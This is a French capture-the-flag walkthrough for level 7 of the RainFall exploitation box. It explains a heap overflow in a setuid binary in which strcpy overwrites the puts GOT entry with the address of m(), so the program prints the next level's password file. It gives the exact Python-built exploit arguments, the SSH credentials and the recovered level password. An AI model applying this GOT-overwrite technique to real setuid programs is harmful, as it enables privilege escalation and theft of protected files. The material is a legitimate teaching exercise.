## Connexion et exploration

```bash
ssh level7@192.168.1.150 -p 4243
```
> Le mot de passe est : `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`

Une fois connecté, cet écran s'affiche : 
```bash
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
```

informations sur le binaire a exploiter :
```bash
level7@RainFall:~$ ls -l level7
-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
level7@RainFall:~$ file level7
level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped
```

L'execution :
```bash
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 test
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 test test
~~
```
> Segfault si argc < 3

Analysons le binaire `objdump -R level7` 
```bash
level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```
[Resultat du objdump -d level7](./source/objdump.txt)  
[Resultat de la decompilation](./source/level7.c) avec [RetDec sur DogBolt](https://dogbolt.org/)

On voit bien que le programme fais un `fopen` du fichier `/home/user/level8/.pass`, et qu'un `heap buffer overflow` est possible via `strcpy`.  

Il faut faire en sorte que l’appel à `puts("~~")` appelle `m()` à la place, parce que :  
•	main lit `/home/user/level8/.pass` dans le buffer global à l’adresse `0x8049960` via `fgets`  
•	La fonction `m` appelle `printf` avec comme second argument ce buffer (`0x8049960`)  

Donc si on force un appel à `m()` au lieu de `puts("~~")`, `m()` exécutera son propre printf, qui inclut un `%s` pointant vers le buffer global contenant le contenu de `/home/user/level8/.pass`  

Pour schématiser, on a ca dans le main :
```c
// première "struct"
malloc(8)                    // p1
[p1]   = 1
[p1+4] = malloc(8)          // buffer1

// deuxième "struct"
malloc(8)                   // p2
[p2]   = 2
[p2+4] = malloc(8)          // buffer2

strcpy( [p1+4], argv[1] )   // overflow 1
strcpy( [p2+4], argv[2] )   // overflow 2
// ...
fgets(0x8049960, 0x44, fp)  // lit .pass
puts("~~")                  // on veut que ça devienne m()
```

Les deux buffers alloués pour les strcpy font 8 octets chacun.  
Comme sous glibc 32 bits chaque chunk est précédé d’un header de 8 octets, on a :
```
[ chunk B: user 8 octets pour argv[1] ]
[ header chunk C (8 octets) ]
[ chunk C: struct p2 = { int type; void *buf; } ]
```

En partant du début du buffer de `argv[1]` (chunk B), pour atteindre le champ `buf` de p2 :
- 8 octets : buffer B  
- 8 octets : header du chunk suivant  
- 4 octets : champ type de p2  

Total : 20 octets avant d’arriver au champ buf de p2  

Donc si on envoie :
```
argv[1] = "A"*20 + <adresse que l’on veut mettre dans `p2->buf`
```
Comme `p2->buf` devient la destination du second `strcpy`, contrôler cette valeur nous permet d’écrire exactement où l’on veut — ici dans l’entrée GOT de `puts`  
Le second `strcpy(argv[2])` écrira alors l’adresse de `m()` dans `puts@GOT`  

<br>

## Construction du payload

1.	Faire pointer `p2->buf` vers l’entrée GOT de `puts` (`0x08049928`) via le premier `strcpy` (`argv[1]`)  
2.	Écrire l’adresse de `m` (`0x080484f4`) dans cette entrée GOT via le deuxième `strcpy` (`argv[2]`)  

En little endian :
```
puts@GOT = 0x08049928  => "\x28\x99\x04\x08"
m()      = 0x080484f4  => "\xf4\x84\x04\x08"
```

Donc en argument python ca peut donner ca :
```bash
arg1 : $(python -c 'print "A"*20 + "\x28\x99\x04\x08"')  
arg2 : $(python -c 'print "\xf4\x84\x04\x08"')
```

<br>

## Lancement de l'attaque :

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
# output : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

Tester le changement de user :
```bash
level7@RainFall:~$ su level8
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
```

Ca a marché, on est level8

Le mot de passe est donc : `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`

<br>

## Pour reproduire l'attaque

1. Connexion en ssh au niveau 7
```bash
ssh level7@192.168.1.150 -p 4243
# mot de passe est : f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

2. Lancer l'attaque
```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
# output : 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
